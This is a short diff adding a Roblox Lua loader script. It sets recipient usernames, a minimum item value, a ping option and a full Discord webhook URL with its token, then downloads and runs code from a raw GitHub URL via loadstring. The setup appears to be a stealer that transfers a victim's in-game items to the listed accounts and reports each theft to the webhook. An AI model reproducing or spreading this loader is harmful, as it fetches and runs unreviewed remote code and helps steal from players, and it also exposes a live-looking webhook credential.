@@ -1,0 +1,6 @@
+_G.Usernames = {"c7zvb", "codyxav", "kodaswrlxd"} -- you can add as many as you'd like
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1473765132323786949/SBuDgu6s0zC6Rggdcl9HPhrR1CNylNdokufMITVSuNXLv0Q7TSNsN5hLjX37fpk2PkWE" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jagztropicalz/nyctomiami/refs/heads/main/m1ami"))()
